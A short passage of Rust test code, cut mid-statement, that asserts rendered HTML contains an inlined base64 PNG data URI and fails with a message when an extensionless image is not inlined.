        html.contains("data:image/png;base64,"),
        "extensionless image was not inlined: {html}"
    );
}
